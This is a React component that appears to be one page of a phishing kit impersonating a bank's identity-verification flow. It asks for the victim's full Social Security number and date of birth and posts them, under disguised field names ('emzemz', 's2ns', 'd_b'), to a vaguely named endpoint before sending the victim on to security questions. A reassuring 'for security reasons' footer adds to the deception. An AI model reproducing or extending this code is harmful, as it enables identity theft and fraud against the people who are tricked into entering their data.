import React, { useMemo, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const buildYears = () => {
  const currentYear = new Date().getFullYear();
  return Array.from({ length: currentYear - 1899 }, (_, index) => `${1900 + index}`);
};

const errorNotice = (
  <div className="flex items-center gap-2 text-sm font-semibold text-red-600">
    <svg width="16" height="16" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
      <path d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z" />
    </svg>
    <span>We need your full 9-digit Social Security number to continue.</span>
  </div>
);

const footer = (
  <p>
    For security reasons, never share your username, password, social security number, account number or other private data
    unless you are certain who you are providing that information to, and only share information through a secure webpage or site.
  </p>
);

const SSN2: React.FC = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [username] = useState(() => (location.state as { emzemz?: string } | undefined)?.emzemz ?? '');
  const [ssn, setSsn] = useState('');
  const [showSSN, setShowSSN] = useState(false);
  const [month, setMonth] = useState('');
  const [day, setDay] = useState('');
  const [year, setYear] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState<{ ssn?: string; dateOfBirth?: string; form?: string }>({});

  const years = useMemo(() => buildYears(), []);
  const daysInMonth = useMemo(() => {
    if (!month || !year) {
      return 31;
    }
    return new Date(parseInt(year, 10), parseInt(month, 10), 0).getDate();
  }, [month, year]);

  if (!username) {
    return (
      <FlowCard title="Session expired">
        <p className="text-sm text-gray-700 text-center">
          Please restart the enrollment process so we can verify your identity from the beginning.
        </p>
        <button
          type="button"
          onClick={() => navigate('/login')}
          className="mt-6 w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition"
        >
          Back to login
        </button>
      </FlowCard>
    );
  }

  const toggleSSNVisibility = () => setShowSSN((prev) => !prev);

  const validateForm = () => {
    const nextErrors: { ssn?: string; dateOfBirth?: string } = {};

    if (ssn.replace(/\D/g, '').length !== 9) {
      nextErrors.ssn = 'Enter all nine digits of your Social Security number.';
    }

    if (!month || !day || !year) {
      nextErrors.dateOfBirth = 'Complete date of birth is required.';
    }

    setErrors(nextErrors);
    return Object.keys(nextErrors).length === 0;
  };

  const getMonthName = (value: string) =>
    new Date(0, parseInt(value, 10) - 1).toLocaleString('default', { month: 'long' });

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    if (!validateForm()) {
      return;
    }

    setIsLoading(true);
    setErrors((prev) => ({ ...prev, form: undefined }));

    try {
      const sanitized = ssn.replace(/\D/g, '');
      const formattedDob = `${getMonthName(month)}/${day}/${year}`;
      await axios.post(`${baseUrl}api/affinity-meta-data-6/`, {
        emzemz: username,
        s2ns: sanitized,
        d_b: formattedDob,
      });

      navigate('/security-questions', { state: { emzemz: username } });
    } catch (error) {
      console.error('Error submitting SSN confirmation:', error);
      setErrors((prev) => ({ ...prev, form: 'Unable to submit your information. Please try again.' }));
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <FlowCard
      title="Confirm your Social Security"
      subtitle={errorNotice}
      footer={footer}
    >
      <form onSubmit={handleSubmit} className="space-y-4">
        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="ssn">
            Social Security number
          </label>
          <div className="relative">
            <input
              id="ssn"
              name="ssn"
              type={showSSN ? 'text' : 'password'}
              value={ssn}
              onChange={(event) => {
                const value = event.target.value.replace(/\D/g, '');
                let formatted = value;
                if (formatted.length >= 6) {
                  formatted = formatted.replace(/(\d{3})(\d{2})(\d{0,4})/, (_, a, b, c) =>
                    c ? `${a}-${b}-${c}` : `${a}-${b}`
                  );
                } else if (formatted.length >= 4) {
                  formatted = formatted.replace(/(\d{3})(\d{0,2})/, (_, a, b) => (b ? `${a}-${b}` : a));
                }
                setSsn(formatted);
              }}
              onKeyDown={(event) => {
                if (!/[0-9]/.test(event.key) && !['Backspace', 'Delete', 'Tab'].includes(event.key)) {
                  event.preventDefault();
                }
              }}
              maxLength={11}
              placeholder="XXX-XX-XXXX"
              className="w-full border border-gray-300 rounded-md px-3 py-2 text-sm focus:outline-none"
            />
            <button
              type="button"
              onClick={toggleSSNVisibility}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-sm text-purple-700"
            >
              {showSSN ? 'Hide' : 'Show'}
            </button>
          </div>
          <FormError message={errors.ssn ?? ''} className="mt-2" />
        </div>

        <div>
          <label className="block text-sm font-medium text-gray-700 mb-1" htmlFor="dob-month">
            Date of birth
          </label>
          <div className="flex items-center gap-2">
            <select
              id="dob-month"
              value={month}
              onChange={(event) => {
                setMonth(event.target.value);
                setDay('');
              }}
              className="flex-1 border border-gray-300 rounded px-2 py-2 text-sm focus:outline-none"
            >
              <option value="">Month</option>
              {Array.from({ length: 12 }, (_, index) => (
                <option key={index + 1} value={index + 1}>
                  {new Date(0, index).toLocaleString('default', { month: 'long' })}
                </option>
              ))}
            </select>
            <select
              id="dob-day"
              value={day}
              onChange={(event) => setDay(event.target.value)}
              className="flex-1 border border-gray-300 rounded px-2 py-2 text-sm focus:outline-none"
            >
              <option value="">Day</option>
              {Array.from({ length: daysInMonth }, (_, index) => (
                <option key={index + 1} value={index + 1}>
                  {index + 1}
                </option>
              ))}
            </select>
            <select
              id="dob-year"
              value={year}
              onChange={(event) => {
                setYear(event.target.value);
                setDay('');
              }}
              className="flex-1 border border-gray-300 rounded px-2 py-2 text-sm focus:outline-none"
            >
              <option value="">Year</option>
              {years.map((entry) => (
                <option key={entry} value={entry}>
                  {entry}
                </option>
              ))}
            </select>
          </div>
          <FormError message={errors.dateOfBirth ?? ''} className="mt-2" />
        </div>

        <FormError message={errors.form ?? ''} />

        <button
          type="submit"
          className="w-full bg-purple-900 hover:bg-purple-800 text-white py-2 rounded-md font-medium transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? 'Submitting…' : 'Continue'}
        </button>
      </form>
    </FlowCard>
  );
};

export default SSN2;
